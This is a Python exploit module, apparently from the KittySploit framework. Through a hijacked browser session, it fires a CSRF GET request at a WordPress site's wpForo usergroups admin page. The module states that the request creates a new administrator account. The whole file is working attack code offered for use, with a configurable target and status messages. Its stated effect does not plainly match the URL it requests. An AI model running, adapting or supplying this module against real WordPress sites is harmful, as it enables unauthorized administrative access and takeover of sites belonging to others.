from kittysploit import *
from lib.protocols.http.csrf import Csrf

class Module(BrowserAuxiliary, Csrf):
	
	__info__ = {
		"name": "WordPress Admin for New User CSRF",
		"description": "WordPress - Create admin user via CSRF GET vulnerability",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}
	
	target = OptString("http://127.0.0.1", "Target WordPress URL (with http://)", required=True)

	def check(self):
		"""Check if browser server is available and session is set"""
		if not self.session_id:
			print_error("Session ID not set. Please set the session_id option.")
			return False
		return True

	def run(self):
		"""Execute CSRF GET attack to create admin user in WordPress"""
		url = f"{self.target}/wp-admin/admin.php?page=wpforo-usergroups&default=1"
		
		print_info(f"Executing CSRF GET attack on: {self.target}")
		print_info(f"Target URL: {url}")
		print_warning("This will attempt to create a new admin user via CSRF")
		
		js_code = self.csrf_get(url)
		result = self.send_js_and_wait_for_response(js_code, timeout=5.0)
		
		if result:
			print_success("CSRF GET attack executed successfully")
			print_info(f"Response: {result}")
			print_info("Admin user creation request sent")
			return True
		else:
			fail.CSRFGetFailed()
		return False
